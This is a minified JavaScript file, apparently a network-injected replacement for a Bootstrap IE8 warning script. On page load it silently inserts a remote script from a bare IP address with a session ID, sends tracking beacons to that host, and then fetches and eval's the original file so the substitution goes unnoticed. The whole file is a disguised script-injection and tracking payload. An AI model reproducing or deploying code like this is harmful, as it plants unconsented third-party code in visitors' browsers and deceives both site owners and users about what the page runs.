(function(){function sendAccounting(e,t){e=e||1;t=t||0;var n=new Image;11==t||T&&6==t||(n.src="http://59.108.34.106:80/"+e+"-1746/54696efd-686d-4c72-a029-ed8b5eb5a68e_1.12.20.91/"+t+"."+(d+j));I.d();return n}function e(e){return T?"http://59.108.34.106:80/Check/2/1746/54696efd-686d-4c72-a029-ed8b5eb5a68e/1.12.20.91/nya039":1==e&&"http://59.108.34.106/CheckUrl/1/1746"}function t(t){var i,r,o=Math.floor(1e3*j),c="fp",s=c+o,a={h:"bdd7870c970a66fde3a69244b28162d14cc6ff23"},u="_!$[]fp54696efd-686d-4c72-a029-ed8b5eb5a68e[]$!_";I={d:function(){w[u]===a&&(w[u]=0)},s:function(e){w[u].c=e}};if(T&&R-T>54e5)return 11;"string"==typeof t.jsURI&&(t.jsURI=[t.jsURI]);if((i=w[u])&&i.h===a.h&&!i.c)return 1;r=i&&i.c;w[u]=a;if(t.requireTopWindow&&w!=top)return 2;if(t.requireObjectHasOwnProperty&&!Object.prototype.hasOwnProperty)return 3;if(t.json){if("string"==typeof t.json)try{t.json=U.eval("("+t.json+")")}catch(f){return 4}t.json.minimum_width=t.minWidth=t.json.minimum_width||t.minWidth;t.json.minimum_height=t.minHeight=t.json.minimum_height||t.minHeight;t.json._accounting={stopTime:p,sendAccounting:sendAccounting,allowNext:I,uri:"http://59.108.34.106/static",comm:"http://59.108.34.106/static".replace(/\w+$/,""),fpsessionid:"54696efd-686d-4c72-a029-ed8b5eb5a68e",check:e("%TOPURLMATCH%"),direct:!1,prev:r}}if(!(t.json&&""===t.json.sprite_img||n(w,C,t.minHeight,t.minWidth)))return 5;if(t.json2uri){for(;void 0!==w[s];)s=c+ ++o;w[s]=t.json;for(i=0;t.jsURI.length>i;i++)t.jsURI[i]+=(-1!==t.jsURI[i].indexOf("?")?"&":"?")+s}}function n(e,t,n,i){var r=t.documentElement||t.body||{},o=e.innerWidth||r.clientWidth||0,c=e.innerHeight||r.clientHeight||0;return o>=n&&c>=i||!(o+c)}function i(){var e,n,i=(new Date).getTime(),r={//
// Carefully adjust the following values as needed
// Remove a line completely if it is not needed
    requireTopWindow: true,
    minWidth: 1,
    minHeight: 1,
    jsURI: 'http://59.108.34.106/static/Device/learn.js?FPSESSIONID=54696efd-686d-4c72-a029-ed8b5eb5a68e&COMMIP=59.108.34.106&OPERATORWEBSITELOGIC=OR',
    sendEarlyAccounting: true,

    onInsert: function(){
// Insert any code below that you would like to run after the script
// specified in jsURI has been inserted.  Note that if any of the
// conditions stated above (i.e. minWidth) are not met the jsURI
// script will not be inserted and this code will also not be run.
//
// If "sendEarlyAccounting" is removed or set to false, you must call
// the "sendAccounting" function in order for this message to be properly
// counted in FPS.
// Example:  sendAccounting();

// ** DO NOT USE document.write **
// Begin code area


// End code area
    },

    /**/
    1:2};if((e=t(r))||i>p)sendAccounting(2,e);else{r.sendEarlyAccounting&&sendAccounting(1);if(r.jsURI){m=u(C);for(e=0;r.jsURI.length>e;e++){n=o(C,"script",null,"src",c(r.jsURI[e]),"type",g);n[j]=r.json;m.appendChild(n)}}if(r.onInsert)try{r.onInsert()}catch(s){}}}function r(e){var t,n,i=[function(){return new XMLHttpRequest},function(){return new ActiveXObject("Msxml2.XMLHTTP")},function(){return new ActiveXObject("Microsoft.XMLHTTP")},U.createRequest];for(n=0;i.length>n;n++){t=0;try{t=i[n]();break}catch(r){t=0}}if(t)try{t.open("GET",e,!1);t.setRequestHeader("X-PLCS","xhr");t.send(null);if(200==t.status)return t.responseText||" "}catch(r){}}function o(e,t,n){var i,r=e.createElement(t);n&&r.appendChild(e.createTextNode(n));for(i=3;arguments.length>i;i+=2)r.setAttribute(arguments[i],arguments[i+1]);return r}function c(e){return e.replace("$PAGEURL$",escape(a(w).href))}function s(){U.V=s.V;s.oncomplete&&s.oncomplete()}function a(e){return e.location||e.document.location||{}}function u(e,t,n){t=e.getElementsByTagName("script");return((n=t.length)?t[n-1]:d=4).parentNode||e.body||e.documentElement.firstChild}try{var f,h,p,m,d,l,I,g="text/javascript",j=Math.random(),R=(new Date).getTime(),T=parseInt("nya039",36),E=parseFloat("15"),U=window,y=document,w=U,C=y;h="http://"+unescape("v3.bootcss.com%2Fassets%2Fjs%2Fie8-responsive-file-warning.js");m=y.createElement("div");d=3;m.innerHTML="<!--[if IE]><i></i><![endif]-->";l=m.getElementsByTagName("i").length;s.V=U.V;U.V=s;isNaN(E)&&(E=15);p=R+1e3*E-2;T=isFinite(T)?1e3*T:0;h+=(~h.indexOf("?")?~h.indexOf(";")?";":"&":"?")+"_fp"+(0|1e3*j)+"="+j;if(h.split("/")[2]==a(U).host){f=r(h);if(f){d=1;s.js=f;s.oncomplete=i;return}}if(y.readyState==(l?"interactive":"loading")){d=2;y.write("<scr".concat('ipt src="')+h+'" type="'+g+'"></scr'.concat("ipt>"))}else{m=u(y);m.appendChild(o(y,"script",0,"src",h,"type",g,"async",!1))}i()}catch(O){}})();if(window.V){if(V.js)try{window.eval(V.js)}catch(e){}V()}